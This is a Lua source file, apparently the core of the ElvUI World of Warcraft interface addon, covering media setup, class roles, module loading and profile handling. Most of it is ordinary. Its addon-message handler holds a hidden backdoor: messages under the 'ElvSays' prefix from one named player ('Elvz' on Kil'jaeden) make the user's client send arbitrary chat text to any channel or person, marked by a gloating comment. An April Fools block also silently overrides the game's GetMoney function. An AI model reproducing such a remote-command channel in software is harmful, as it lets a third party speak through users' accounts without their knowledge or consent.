local E, L, V, P, G, _ = unpack(select(2, ...)); --Inport: Engine, Locales, PrivateDB, ProfileDB, GlobalDB, Localize Underscore
local LSM = LibStub("LibSharedMedia-3.0")
local _, ns = ...
local ElvUF = ns.oUF

local find, split, match, format = string.find, string.split, string.match, string.format
local twipe = table.wipe
local pairs, select, type, tonumber = pairs, select, type, tonumber

--Constants
_, E.myclass = UnitClass("player");
E.myname, _ = UnitName("player");
E.myguid = UnitGUID('player');
E.version = GetAddOnMetadata("ElvUI", "Version"); 
E.myrealm = GetRealmName();
_, E.wowbuild = GetBuildInfo(); E.wowbuild = tonumber(E.wowbuild);
E.resolution = GetCVar("gxResolution")
E.screenheight = tonumber(match(E.resolution, "%d+x(%d+)"))
E.screenwidth = tonumber(match(E.resolution, "(%d+)x+%d"))

--Tables
E["media"] = {};
E["frames"] = {};
E["texts"] = {};
E['snapBars'] = {}
E["RegisteredModules"] = {}
E['RegisteredInitialModules'] = {}
E['valueColorUpdateFuncs'] = {};
E.TexCoords = {.08, .92, .08, .92}
E.FrameLocks = {}
E.CreditsList = {};
E.Spacing = 1;
E.Border = 2;
E.PixelMode = false;

E.InversePoints = {
	TOP = 'BOTTOM',
	BOTTOM = 'TOP',
	TOPLEFT = 'BOTTOMLEFT',
	TOPRIGHT = 'BOTTOMRIGHT',
	LEFT = 'RIGHT',
	RIGHT = 'LEFT',
	BOTTOMLEFT = 'TOPLEFT',
	BOTTOMRIGHT = 'TOPRIGHT'
}

E.DispelClasses = {
	['PRIEST'] = {
		['Magic'] = true,
		['Disease'] = true
	},
	['SHAMAN'] = {
		['Magic'] = false,
		['Curse'] = true
	},
	['PALADIN'] = {
		['Poison'] = true,
		['Magic'] = false,
		['Disease'] = true
	},
	['MAGE'] = {
		['Curse'] = true
	},
	['DRUID'] = {
		['Magic'] = false,
		['Curse'] = true,
		['Poison'] = true
	},
	['MONK'] = {
		['Magic'] = false,
		['Disease'] = true,
		['Poison'] = true
	}
}

E.HealingClasses = {
	PALADIN = 1,
	SHAMAN = 3,
	DRUID = 4,
	MONK = 2,
	PRIEST = {1, 2}
}

E.ClassRole = {
	PALADIN = {
		[1] = "Caster",
		[2] = "Tank",
		[3] = "Melee",
	},
	PRIEST = "Caster",
	WARLOCK = "Caster",
	WARRIOR = {
		[1] = "Melee",
		[2] = "Melee",
		[3] = "Tank",	
	},
	HUNTER = "Melee",
	SHAMAN = {
		[1] = "Caster",
		[2] = "Melee",
		[3] = "Caster",	
	},
	ROGUE = "Melee",
	MAGE = "Caster",
	DEATHKNIGHT = {
		[1] = "Tank",
		[2] = "Melee",
		[3] = "Melee",	
	},
	DRUID = {
		[1] = "Caster",
		[2] = "Melee",
		[3] = "Tank",	
		[4] = "Caster"
	},
	MONK = {
		[1] = "Tank",
		[2] = "Caster",
		[3] = "Melee",	
	},
}

E.KnownColors = {
	Red = { 1, 0, 0 },
	Green = { 0, 1, 0 },
	Blue = { 0, 0, 1 },
	Yellow = { 1, 1, 0 },
	White = { 1, 1, 1 },
	Black = { 0, 0 , 0},
}

E.noop = function() end;

function E:Print(msg)
	print(('%sElvUI:|r'):format(self["media"].hexvaluecolor), msg)
end

--Basically check if another class border is being used on a class that doesn't match. And then return true if a match is found.
local function CheckClassColor(r, g, b)
	if E.private.theme ~= 'class' then return end
	local matchFound = false;
	for class, _ in pairs(RAID_CLASS_COLORS) do
		if class ~= E.myclass then
			if RAID_CLASS_COLORS[class].r == r and RAID_CLASS_COLORS[class].g == g and RAID_CLASS_COLORS[class].b == b then
				matchFound = true;
			end
		end
	end
	
	return matchFound
end

function E:GetColorTable(data)
	if not data.r or not data.g or not data.b then
		error("Could not unpack color values.")
	end
	
	if data.a then
		return {data.r, data.g, data.b, data.a}
	else
		return {data.r, data.g, data.b}
	end
end

function E:UpdateMedia()	
	--Fonts
	self["media"].normFont = LSM:Fetch("font", self.db['general'].font)
	self["media"].combatFont = LSM:Fetch("font", self.db['general'].dmgfont)
	

	--Textures
	self["media"].blankTex = LSM:Fetch("background", "ElvUI Blank")
	self["media"].normTex = LSM:Fetch("statusbar", self.private['general'].normTex)
	self["media"].glossTex = LSM:Fetch("statusbar", self.private['general'].glossTex)

	--Border Color
	local border = E.db['general'].bordercolor
	if CheckClassColor(border.r, border.g, border.b) then
		border = RAID_CLASS_COLORS[E.myclass]
		E.db['general'].bordercolor.r = RAID_CLASS_COLORS[E.myclass].r
		E.db['general'].bordercolor.g = RAID_CLASS_COLORS[E.myclass].g
		E.db['general'].bordercolor.b = RAID_CLASS_COLORS[E.myclass].b	
	elseif E.PixelMode then
		border = {r = 0, g = 0, b = 0}
	end
	self["media"].bordercolor = {border.r, border.g, border.b}

	--Backdrop Color
	self["media"].backdropcolor = E:GetColorTable(self.db['general'].backdropcolor)

	--Backdrop Fade Color
	self["media"].backdropfadecolor = E:GetColorTable(self.db['general'].backdropfadecolor)
	
	--Value Color
	local value = self.db['general'].valuecolor
	if CheckClassColor(value.r, value.g, value.b) then
		value = RAID_CLASS_COLORS[E.myclass]
		self.db['general'].valuecolor.r = RAID_CLASS_COLORS[E.myclass].r
		self.db['general'].valuecolor.g = RAID_CLASS_COLORS[E.myclass].g
		self.db['general'].valuecolor.b = RAID_CLASS_COLORS[E.myclass].b		
	end
	self["media"].hexvaluecolor = self:RGBToHex(value.r, value.g, value.b)
	self["media"].rgbvaluecolor = {value.r, value.g, value.b}
	
	if LeftChatPanel and LeftChatPanel.tex and RightChatPanel and RightChatPanel.tex then
		LeftChatPanel.tex:SetTexture(E.db.chat.panelBackdropNameLeft)
		LeftChatPanel.tex:SetAlpha(E.db.general.backdropfadecolor.a - 0.55 > 0 and E.db.general.backdropfadecolor.a - 0.55 or 0.5)		
		
		RightChatPanel.tex:SetTexture(E.db.chat.panelBackdropNameRight)
		RightChatPanel.tex:SetAlpha(E.db.general.backdropfadecolor.a - 0.55 > 0 and E.db.general.backdropfadecolor.a - 0.55 or 0.5)		
	end
	
	self:ValueFuncCall()
	self:UpdateBlizzardFonts()
end

function E:RequestBGInfo()
	RequestBattlefieldScoreData()
end

function E:PLAYER_ENTERING_WORLD()
	self:CheckRole()
	if not self.MediaUpdated then
		self:UpdateMedia()
		self.MediaUpdated = true;
	end
	
	local _, instanceType = IsInInstance();
	if instanceType == "pvp" then
		self.BGTimer = self:ScheduleRepeatingTimer("RequestBGInfo", 5)
		self:RequestBGInfo()
	elseif self.BGTimer then
		self:CancelTimer(self.BGTimer)
		self.BGTimer = nil;
	end
end

function E:ValueFuncCall()
	for func, _ in pairs(self['valueColorUpdateFuncs']) do
		func(self["media"].hexvaluecolor, unpack(self["media"].rgbvaluecolor))
	end
end

function E:UpdateFrameTemplates()
	for frame, _ in pairs(self["frames"]) do
		if frame and frame.template  then
			frame:SetTemplate(frame.template, frame.glossTex);
		else
			self["frames"][frame] = nil;
		end
	end
end

function E:UpdateBorderColors()
	for frame, _ in pairs(self["frames"]) do
		if frame and not frame.ignoreUpdates then
			if frame.template == 'Default' or frame.template == 'Transparent' or frame.template == nil then
				frame:SetBackdropBorderColor(unpack(self['media'].bordercolor))
			end
		else
			self["frames"][frame] = nil;
		end
	end
end	

function E:UpdateBackdropColors()
	for frame, _ in pairs(self["frames"]) do
		if frame then
			if frame.template == 'Default' or frame.template == nil then
				if frame.backdropTexture then
					frame.backdropTexture:SetVertexColor(unpack(self['media'].backdropcolor))
				else
					frame:SetBackdropColor(unpack(self['media'].backdropcolor))				
				end
			elseif frame.template == 'Transparent' then
				frame:SetBackdropColor(unpack(self['media'].backdropfadecolor))
			end
		else
			self["frames"][frame] = nil;
		end
	end
end	

function E:UpdateFontTemplates()
	for text, _ in pairs(self["texts"]) do
		if text then
			text:FontTemplate(text.font, text.fontSize, text.fontStyle);
		else
			self["texts"][text] = nil;
		end
	end
end

--This frame everything in ElvUI should be anchored to for Eyefinity support.
E.UIParent = CreateFrame('Frame', 'ElvUIParent', UIParent);
E.UIParent:SetFrameLevel(UIParent:GetFrameLevel());
E.UIParent:SetPoint('CENTER', UIParent, 'CENTER');
E.UIParent:SetSize(UIParent:GetSize());
E['snapBars'][#E['snapBars'] + 1] = E.UIParent

E.HiddenFrame = CreateFrame('Frame')
E.HiddenFrame:Hide()


function E:CheckTalentTree(tree)
	local activeGroup = GetActiveSpecGroup()
	if type(tree) == 'number' then
		if activeGroup and GetSpecialization(false, false, activeGroup) then
			return tree == GetSpecialization(false, false, activeGroup)
		end
	elseif type(tree) == 'table' then
		local activeGroup = GetActiveSpecGroup()
		for _, index in pairs(tree) do
			if activeGroup and GetSpecialization(false, false, activeGroup) then
				return index == GetSpecialization(false, false, activeGroup)
			end		
		end
	end
end

function E:IsDispellableByMe(debuffType)
	if not self.DispelClasses[self.myclass] then return; end
	
	if self.DispelClasses[self.myclass][debuffType] then
		return true;
	end
end

function E:CheckRole()
	local talentTree = GetSpecialization()
	local IsInPvPGear = false;
	local resilperc = GetCombatRatingBonus(COMBAT_RATING_RESILIENCE_PLAYER_DAMAGE_TAKEN)
	if resilperc > GetDodgeChance() and resilperc > GetParryChance() and UnitLevel('player') == MAX_PLAYER_LEVEL then
		IsInPvPGear = true;
	end
	
	self.role = nil;
	
	if type(self.ClassRole[self.myclass]) == "string" then
		self.role = self.ClassRole[self.myclass]
	elseif talentTree then
		self.role = self.ClassRole[self.myclass][talentTree]
	end
	
	if self.role == "Tank" and IsInPvPGear then
		self.role = "Melee"
	end
	
	if not self.role then
		local playerint = select(2, UnitStat("player", 4));
		local playeragi	= select(2, UnitStat("player", 2));
		local base, posBuff, negBuff = UnitAttackPower("player");
		local playerap = base + posBuff + negBuff;

		if (playerap > playerint) or (playeragi > playerint) then
			self.role = "Melee";
		else
			self.role = "Caster";
		end		
	end

	if self.HealingClasses[self.myclass] ~= nil and self.myclass ~= 'PRIEST' then
		if self:CheckTalentTree(self.HealingClasses[self.myclass]) then
			self.DispelClasses[self.myclass].Magic = true;
		else
			self.DispelClasses[self.myclass].Magic = false;
		end
	end
end

function E:IncompatibleAddOn(addon, module)
	E.PopupDialogs['INCOMPATIBLE_ADDON'].button1 = addon
	E.PopupDialogs['INCOMPATIBLE_ADDON'].button2 = 'ElvUI '..module
	E.PopupDialogs['INCOMPATIBLE_ADDON'].addon = addon
	E.PopupDialogs['INCOMPATIBLE_ADDON'].module = module
	E:StaticPopup_Show('INCOMPATIBLE_ADDON', addon, module)
end

function E:CheckIncompatible()
	if E.global.ignoreIncompatible then return; end
	if IsAddOnLoaded('Prat-3.0') and E.private.chat.enable then
		E:IncompatibleAddOn('Prat-3.0', 'Chat')
	elseif IsAddOnLoaded('Chatter') and E.private.chat.enable then
		E:IncompatibleAddOn('Chatter', 'Chat')
	end
	
	if IsAddOnLoaded('TidyPlates') and E.private.nameplate.enable then
		E:IncompatibleAddOn('TidyPlates', 'NamePlate')
	elseif IsAddOnLoaded('Aloft') and E.private.nameplate.enable then
		E:IncompatibleAddOn('Aloft', 'NamePlate')
	end	
end

function E:IsFoolsDay()
	if find(date(), '04/01/') and not E.global.aprilFools then
		return true;
	else
		return false;
	end
end

function E:CopyTable(currentTable, defaultTable)
	if type(currentTable) ~= "table" then currentTable = {} end
	
	if type(defaultTable) == 'table' then
		for option, value in pairs(defaultTable) do
			if type(value) == "table" then
				value = self:CopyTable(currentTable[option], value)
			end
			
			currentTable[option] = value			
		end
	end
	
	return currentTable
end

function E:SendMessage()
	local _, instanceType = IsInInstance()
	if IsInRaid() then
		SendAddonMessage("ElvUIVC", E.version, (not IsInRaid(LE_PARTY_CATEGORY_HOME) and IsInRaid(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "RAID")
	elseif IsInGroup() then
		SendAddonMessage("ElvUIVC", E.version, (not IsInGroup(LE_PARTY_CATEGORY_HOME) and IsInGroup(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "PARTY")
	end
	
	if E.SendMSGTimer then
		self:CancelTimer(E.SendMSGTimer)
		E.SendMSGTimer = nil
	end
end

local function SendRecieve(self, event, prefix, message, channel, sender)
	if event == "CHAT_MSG_ADDON" then
		if sender == E.myname then return end

		if prefix == "ElvUIVC" and sender ~= 'Elvz' and not find(sender, "Elvz%-Kil'jaeden") and not E.recievedOutOfDateMessage then
			if E.version ~= 'BETA' and tonumber(message) ~= nil and tonumber(message) > tonumber(E.version) then
				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from http://www.tukui.org"])
				E.recievedOutOfDateMessage = true
			end
		elseif prefix == 'ElvSays' and ((sender == 'Elvz' and E.myrealm == "Kil'jaeden") or find(sender, "Elvz%-Kil'jaeden")) then ---HAHHAHAHAHHA
			local user, channel, msg, sendTo = split(',', message)
			
			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
				SendChatMessage(msg, channel, nil, sendTo)
			end
		end
	else
		E.SendMSGTimer = E:ScheduleTimer('SendMessage', 12)
	end
end

local f = CreateFrame('Frame')
f:RegisterEvent("GROUP_ROSTER_UPDATE")
f:RegisterEvent("CHAT_MSG_ADDON")
f:SetScript('OnEvent', SendRecieve)

function E:UpdateAll(ignoreInstall)
	self.data = LibStub("AceDB-3.0"):New("ElvDB", self.DF);
	self.data.RegisterCallback(self, "OnProfileChanged", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileCopied", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileReset", "OnProfileReset")
	self.db = self.data.profile;
	self.global = self.data.global;
	
	self.db.theme = nil;
	self.db.install_complete = nil;	
	
	self:SetMoversPositions()
	self:UpdateMedia()
	
	local UF = self:GetModule('UnitFrames')
	UF.db = self.db.unitframe
	UF:Update_AllFrames()
	
	local CH = self:GetModule('Chat')
	CH.db = self.db.chat
	CH:PositionChat(true); 
	
	local AB = self:GetModule('ActionBars')
	AB.db = self.db.actionbar
	AB:UpdateButtonSettings()
	AB:UpdateMicroPositionDimensions()
	 
	local bags = E:GetModule('Bags'); 
	bags.db = self.db.bags
	bags:Layout(); 
	bags:Layout(true); 
	bags:PositionBagFrames()
	bags:SizeAndPositionBagBar()
	
	local totems = E:GetModule('Totems'); 
	totems.db = self.db.general.totems
	totems:PositionAndSize()
	totems:ToggleEnable()
	
	self:GetModule('Layout'):ToggleChatPanels()
	
	local DT = self:GetModule('DataTexts')
	DT.db = self.db.datatexts
	DT:LoadDataTexts()
	
	local NP = self:GetModule('NamePlates')
	NP.db = self.db.nameplate
	NP:UpdateAllPlates()
		
	local M = self:GetModule("Misc")
	M:UpdateExpRepDimensions()
	M:EnableDisable_ExperienceBar()
	M:EnableDisable_ReputationBar()	
	
	local T = self:GetModule('Threat')
	T.db = self.db.general.threat
	T:UpdatePosition()
	T:ToggleEnable()
	
	self:GetModule('Auras').db = self.db.auras
	self:GetModule('Tooltip').db = self.db.tooltip
	
	E:GetModule('Auras'):UpdateAllHeaders()
	
	if self.private.install_complete == nil or (self.private.install_complete and type(self.private.install_complete) == 'boolean') or (self.private.install_complete and type(tonumber(self.private.install_complete)) == 'number' and tonumber(self.private.install_complete) <= 3.83) then
		if not ignoreInstall then
			self:Install()
		end
	end
	
	self:GetModule('Minimap'):UpdateSettings()
	
	self:UpdateBorderColors()
	self:UpdateBackdropColors()
	self:UpdateFrameTemplates()
	
	local LO = E:GetModule('Layout')
	LO:ToggleChatPanels()	
	LO:BottomPanelVisibility()
	LO:TopPanelVisibility()
	

	collectgarbage('collect');
end

function E:RemoveNonPetBattleFrames()
	if InCombatLockdown() then return end
	for object, _ in pairs(E.FrameLocks) do
		_G[object]:SetParent(E.HiddenFrame)
	end
end

function E:AddNonPetBattleFrames()
	if InCombatLockdown() then return end
	for object, _ in pairs(E.FrameLocks) do
		_G[object]:SetParent(UIParent)
	end
end

function E:ResetAllUI()
	self:ResetMovers()

	if E.db.lowresolutionset then
		E:SetupResolution(true)
	end	

	if E.db.layoutSet then
		E:SetupLayout(E.db.layoutSet, true)
	end
end

function E:ResetUI(...)
	if InCombatLockdown() then E:Print(ERR_NOT_IN_COMBAT) return end
	
	if ... == '' or ... == ' ' or ... == nil then
		E:StaticPopup_Show('RESETUI_CHECK')
		return
	end
	
	self:ResetMovers(...)
end

function E:RegisterModule(name)
	if self.initialized then
		self:GetModule(name):Initialize()
	else
		self['RegisteredModules'][#self['RegisteredModules'] + 1] = name
	end
end

function E:RegisterInitialModule(name)
	self['RegisteredInitialModules'][#self['RegisteredInitialModules'] + 1] = name
end

function E:InitializeInitialModules()
	for _, module in pairs(E['RegisteredInitialModules']) do
		local module = self:GetModule(module, true)
		if module and module.Initialize then
			local _, catch = pcall(module.Initialize, module)
			if catch and GetCVarBool('scriptErrors') == 1 then
				ScriptErrorsFrame_OnError(catch, false)
			end
		end
	end
end

function E:RefreshModulesDB()
	local UF = self:GetModule('UnitFrames')
	twipe(UF.db)
	UF.db = self.db.unitframe
end

function E:InitializeModules()	
	for _, module in pairs(E['RegisteredModules']) do
		local module = self:GetModule(module)
		if module.Initialize then
			local _, catch = pcall(module.Initialize, module)
			if catch and GetCVarBool('scriptErrors') == 1 then
				ScriptErrorsFrame_OnError(catch, false)
			end
		end
	end
end

--DATABASE CONVERSIONS
function E:DBConversions()

end

function E:Initialize()
	twipe(self.db)
	twipe(self.global)
	twipe(self.private)
	
	self.data = LibStub("AceDB-3.0"):New("ElvDB", self.DF);
	self.data.RegisterCallback(self, "OnProfileChanged", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileCopied", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileReset", "OnProfileReset")
	
	self.charSettings = LibStub("AceDB-3.0"):New("ElvPrivateDB", self.privateVars);	
	self.private = self.charSettings.profile
	self.db = self.data.profile;
	self.global = self.data.global;
	self:CheckIncompatible()
	self:DBConversions()
	
	self:CheckRole()
	self:UIScale('PLAYER_LOGIN');

	self:LoadConfig(); --Load In-Game Config
	self:LoadCommands(); --Load Commands
	self:InitializeModules(); --Load Modules	
	self:LoadMovers(); --Load Movers

	self.initialized = true
	
	if self.private.install_complete == nil then
		self:Install()
	end
	
	if not find(date(), '04/01/') then	
		E.global.aprilFools = nil;
	end
	
	if E:IsFoolsDay() then
		function GetMoney()
			return 0;
		end
		E:Delay(45, function()
			E:StaticPopup_Show('APRIL_FOOLS')
		end)
	end
	
	RegisterAddonMessagePrefix('ElvUIVC')
	RegisterAddonMessagePrefix('ElvSays')
	
	self:UpdateMedia()
	self:UpdateFrameTemplates()
	self:RegisterEvent("ACTIVE_TALENT_GROUP_CHANGED", "CheckRole");
	self:RegisterEvent("PLAYER_TALENT_UPDATE", "CheckRole");
	self:RegisterEvent("CHARACTER_POINTS_CHANGED", "CheckRole");
	self:RegisterEvent("UNIT_INVENTORY_CHANGED", "CheckRole");
	self:RegisterEvent("UPDATE_BONUS_ACTIONBAR", "CheckRole");	
	self:RegisterEvent('UI_SCALE_CHANGED', 'UIScale')
	self:RegisterEvent('PLAYER_ENTERING_WORLD')
	self:RegisterEvent("PET_BATTLE_CLOSE", 'AddNonPetBattleFrames')
	self:RegisterEvent('PET_BATTLE_OPENING_START', "RemoveNonPetBattleFrames")	
	
	self:Tutorials()
	self:GetModule('Minimap'):UpdateSettings()
	self:RefreshModulesDB()
	collectgarbage("collect");
	
	if self.db.general.loginmessage then
		print(select(2, E:GetModule('Chat'):FindURL("CHAT_MSG_DUMMY", format(L['LOGIN_MSG'], self["media"].hexvaluecolor, self["media"].hexvaluecolor, self.version)))..'.')
	end	
end